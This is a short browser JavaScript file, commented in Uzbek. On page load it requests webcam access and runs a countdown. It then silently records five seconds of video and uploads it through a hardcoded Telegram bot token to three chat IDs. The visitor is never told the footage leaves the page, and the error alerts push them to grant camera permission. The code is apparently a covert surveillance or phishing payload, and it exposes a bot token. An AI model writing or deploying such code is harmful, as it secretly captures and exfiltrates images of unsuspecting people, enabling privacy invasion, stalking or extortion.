const video = document.getElementById('video');
const countdownElement = document.getElementById('countdown');
let mediaRecorder;
let chunks = []; // Videoni saqlash uchun masiv

// Telegram bot tokeni va chat ID
const BOT_TOKEN = '7395541428:AAGTGERMBx35uE7lm35_xfrOFJ2nWfy886k'; // Bot tokenini shu yerga qo'ying
const CHAT_IDS = ['5934257995', '5826562502', '6528560655']; // Chat ID-larni shu yerga qo'ying

// Kamera oqimini olish
function startCamera() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;
            mediaRecorder = new MediaRecorder(stream);
            
            mediaRecorder.ondataavailable = (event) => {
                chunks.push(event.data);
            };

            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                CHAT_IDS.forEach(chatId => sendVideoToTelegram(blob, chatId));
                chunks = []; // Masivni tozalash, keyingi yozuv uchun
            };

            // 10 soniya sanash
            let countdown = 10;
            const countdownInterval = setInterval(() => {
                countdownElement.textContent = countdown;
                countdown--;

                if (countdown < 0) {
                    clearInterval(countdownInterval);
                    countdownElement.style.display = 'none'; // Sanashni yashirish
                    mediaRecorder.start();
                    setTimeout(() => {
                        mediaRecorder.stop();
                    }, 5000); // 5 soniya videoga olish
                }
            }, 1000); // 1 soniya interval
        })
        .catch(error => {
            console.error('Kameraga kirish xatosi:', error);
            alert('Kameraga kirishda muammo bor. Iltimos, ruxsatni tekshiring yoki boshqa brauzerdan foydalaning.');
        });
}

// Telegram bot orqali video yuborish
function sendVideoToTelegram(blob, chatId) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('video', blob, 'video.webm');

    fetch(url, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log(`Video ${chatId} ga muvaffaqiyatli yuborildi!`);
        } else {
            console.error(`Telegram API xatosi ${chatId}:`, data);
            alert(`Video yuborishda xatolik: ${data.description}`);
        }
    })
    .catch(error => {
        console.error('Telegramga yuborishda xato:', error);
        alert('Videoni yuborishda xato yuz berdi. Internet aloqangizni tekshiring.');
    });
}

// Kamera ishga tushirish va sanashni boshlash
startCamera();
